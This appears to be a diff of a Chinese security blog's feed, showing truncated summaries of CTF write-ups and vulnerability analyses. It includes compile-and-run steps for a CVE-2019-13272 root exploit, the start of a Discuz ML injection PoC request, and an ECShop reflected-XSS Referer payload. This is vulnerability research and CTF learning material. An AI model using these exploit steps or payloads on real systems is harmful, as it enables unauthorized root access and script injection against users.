-      最近发现北京联合大学的OJ平台特别不错，题目都是近期比赛的题，有些是在比赛中解出了的，有些没有解出刚好想要复现，这里简单记录下解题的思路过程，有时间练手就更新。平台地址：https://buuoj.cn/
-
-0x01 Warmup
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-
-
-php
-    highlight_file(__FILE__);
-    clas
+      &lt;p&gt;最近发现北京联合大学的OJ平台特别不错，题目都是近期比赛的题，有些是在比赛中解出了的，有些没有解出刚好想要复现，这里简单记录下解题的思路过程，有时间练手就更新。平台地址：&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://buuoj.cn/&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x01-Warmup&quot;&gt;&lt;a href=&quot;#0x01-Warmup&quot; class=&quot;headerlink&quot; title=&quot;0x01 Warmup&quot;&gt;&lt;/a&gt;0x01 Warmup&lt;/h3&gt;
     
     </summary>
     
@@ -677,31 +340,7 @@ php
     
     <summary type="html">
     
-      0x01 相关信息
-漏洞类型：Linux本地提权
-漏洞影响范围：Linux内核版本低于5.1.17
-测试主机信息：
-
-1
-
-
-Linux ubuntu 4.15.0-30-generic #32-Ubuntu SMP Thu Jul 26 17:42:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
-
-
-Exploit测试
-EXP下载：exploit下载地址，进行编译运行即可获得本地root权限（需要交互式shell）
-
-1
-2
-
-
-gcc cve-2019-13272_exp.c -o exp
-./exp
-
-
-
-
-目前Linux已经提供修复补丁，下载地址：
+      &lt;h3 id=&quot;0x01-相关信息&quot;&gt;&lt;a href=&quot;#0x01-相关信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 相关信息&quot;&gt;&lt;/a&gt;0x01 相关信息&lt;/h3&gt;&lt;p&gt;漏洞类型：Linux本地提权&lt;br&gt;漏洞影响范围：Linux内核版本低于5.1.17&lt;br&gt;测试主机信息：&lt;/p&gt;
     
     </summary>
     
@@ -728,20 +367,8 @@ gcc cve-2019-13272_exp.c -o exp
     
     <summary type="html">
     
-      配置本地的phpstorm + Xdebug动态环境真的是一个糟心的事，之前一直出问题，现在重新配简单的记录下，本地的php环境是用phpstudy实现，各个版本都默认带有xdebug插件，php.ini中配置调用就好。
-
-0x01 php.ini配置
-1
-2
-3
-4
-5
-
-
-zend_extension=&quot;D:\PhpStudy2018\PHPTutorial\php\php-7.0.12-nts\ext\php_xdebug.dll&quot; //xdebug.dll物理地址
-xdebug.remote_enable=1
-xdebug.remote_host=localhost 
-xdebug.r
+      &lt;p&gt;配置本地的phpstorm + Xdebug动态环境真的是一个糟心的事，之前一直出问题，现在重新配简单的记录下，本地的php环境是用phpstudy实现，各个版本都默认带有xdebug插件，php.ini中配置调用就好。&lt;/p&gt;
+&lt;h3 id=&quot;0x01-php-ini配置&quot;&gt;&lt;a href=&quot;#0x01-php-ini配置&quot; class=&quot;headerlink&quot; title=&quot;0x01 php.ini配置&quot;&gt;&lt;/a&gt;0x01 php.ini配置&lt;/h3&gt;
     
     </summary>
     
@@ -764,27 +391,7 @@ xdebug.r
     
     <summary type="html">
     
-      0x00 前言
-7月11号Discuz ML被爆出存在任意代码注入漏洞，Discuz在国内的用户量还是很可观的，国外还没有去关注，从官方下载源码对漏洞的原理详细的分析了一下，源码地址(http://discuz.ml/download）
-
-0x01 POC
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-
-
-GET / HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
-Accept: text/html,applic
+      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;7月11号Discuz ML被爆出存在任意代码注入漏洞，Discuz在国内的用户量还是很可观的，国外还没有去关注，从官方下载源码对漏洞的原理详细的分析了一下，源码地址(&lt;a href=&quot;http://discuz.ml/download）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://discuz.ml/download）&lt;/a&gt;&lt;/p&gt;
     
     </summary>
     
@@ -809,10 +416,8 @@ Accept: text/html,applic
     
     <summary type="html">
     
-      这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g 提取码: kj7b）
-
-0x01 laravel
-这个下发的版本是5.7，并且之前有人发表过对该版本的漏洞的分析文章，所以这题差不多算是一个web签到题，这里贴一下链接:https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8
+      &lt;p&gt;&lt;strong&gt;这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（&lt;a href=&quot;https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g&lt;/a&gt; 提取码: kj7b）&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&quot;0x01-laravel&quot;&gt;&lt;a href=&quot;#0x01-laravel&quot; class=&quot;headerlink&quot; title=&quot;0x01 laravel&quot;&gt;&lt;/a&gt;0x01 laravel&lt;/h1&gt;
     
     </summary>
     
@@ -837,28 +442,7 @@ Accept: text/html,applic
     
     <summary type="html">
     
-      0x01 upload
-扫描得到源码文件：www.tar.gz，所以这道题目主要就是代码审计的工作，网站的主体功能代码在：application\web，漏洞触发点在Porfile
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-
-
-if($this-&gt;ext) {	if(getimagesize($this-&gt;filename_tmp)) {
-	@copy($this-&gt;filename_tmp, $this-&gt;filename);
-	@unlink($this-&gt;filename_tmp);	
-	$this-&gt;img=&quot;../upload/$this-&gt;upload_menu
+      &lt;h3 id=&quot;0x01-upload&quot;&gt;&lt;a href=&quot;#0x01-upload&quot; class=&quot;headerlink&quot; title=&quot;0x01 upload&quot;&gt;&lt;/a&gt;0x01 upload&lt;/h3&gt;&lt;p&gt;扫描得到源码文件：&lt;a href=&quot;http://www.tar.gz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.tar.gz&lt;/a&gt;，所以这道题目主要就是代码审计的工作，网站的主体功能代码在：application\web，漏洞触发点在Porfile&lt;/p&gt;
     
     </summary>
     
@@ -887,49 +471,7 @@ if($this-&gt;ext) {	if(getimagesize($this-&gt;filename_tmp)) {
     
     <summary type="html">
     
-      0x01 JustSoso
-本题的主要知识点在于反序列化的应用和parse_url()函数的解析问题，首先通过网页源码中的文件读取提示读取得到index.php文件源码和hint文件源码，任意文件读取就不做介绍了。
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-
-
-#index.php
-&lt;html&gt;
-php
-error_reporting(0); 
-$file = $_GET[&quot;file&quot;]; 
-$payload = $_GET[&quot;payload&quot;];
-if(!iss&lt;/html&gt;
+      &lt;h3 id=&quot;0x01-JustSoso&quot;&gt;&lt;a href=&quot;#0x01-JustSoso&quot; class=&quot;headerlink&quot; title=&quot;0x01 JustSoso&quot;&gt;&lt;/a&gt;0x01 JustSoso&lt;/h3&gt;&lt;p&gt;本题的主要知识点在于反序列化的应用和parse_url()函数的解析问题，首先通过网页源码中的文件读取提示读取得到index.php文件源码和hint文件源码，任意文件读取就不做介绍了。&lt;/p&gt;
     
     </summary>
     
@@ -958,30 +500,7 @@ if(!iss&lt;/html&gt;
     
     <summary type="html">
     
-      easy_function
-1
-2
-3
-4
-5
-6
-7
-8
-9
-
-
-php
-$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
-$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;
-
-if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
-    show_source(__FILE__);
-} else {
-    $action(&#39;&#39;, $arg);
-}
-
-
-正则禁用了a-z0-9_，同时匹配了^$，即在开头结尾加上符合正则的字符就可以绕过后续字符串的匹配，所以思路就是fuzz一下开头结尾，看看会不会存在某个字符使得整个字符串可以绕过
+      &lt;h3 id=&quot;easy-function&quot;&gt;&lt;a href=&quot;#easy-function&quot; class=&quot;headerlink&quot; title=&quot;easy_function&quot;&gt;&lt;/a&gt;easy_function&lt;/h3&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;$action = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;action&#39;&lt;/span&gt;] ?? &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;$arg = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;arg&#39;&lt;/span&gt;] ?? &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/^[a-z0-9_]*$/isD&#39;&lt;/span&gt;, $action)) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $action(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, $arg);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
     
     </summary>
     
@@ -1004,14 +523,8 @@ if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
     
     <summary type="html">
     
-      原文已发Freebuf ECShop 4.0反射型XSS漏洞分析 
-前言： Ecshop是国内的一款开源的电商框架，在国内应用较为广泛，当前最新版本为4.0.0，最近对其代码进行了简单的分析，发现可以绕过其filter触发XSS。
-
-一、漏洞利用方式
-发送GET请求包如下：
-
-GET/CMS/ECShop_V4.0./user.php HTTP/1.1
-Referer:https://127.0.0.1&quot; /&gt;&lt;a href=&quot;j&amp;#97v&amp;#97script:&amp;#97lert(‘Cyc1e_test’)&quot;&gt;&lt;/a&gt;
+      &lt;p&gt;&lt;strong&gt;原文已发&lt;a href=&quot;https://www.freebuf.com/vuls/198140.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Freebuf ECShop 4.0反射型XSS漏洞分析 &lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;前言&lt;/strong&gt;： Ecshop是国内的一款开源的电商框架，在国内应用较为广泛，当前最新版本为4.0.0，最近对其代码进行了简单的分析，发现可以绕过其filter触发XSS。&lt;/p&gt;
+&lt;h2 id=&quot;一、漏洞利用方式&quot;&gt;&lt;a href=&quot;#一、漏洞利用方式&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞利用方式&quot;&gt;&lt;/a&gt;&lt;strong&gt;一、漏洞利用方式&lt;/strong&gt;&lt;/h2&gt;
     
     </summary>
     
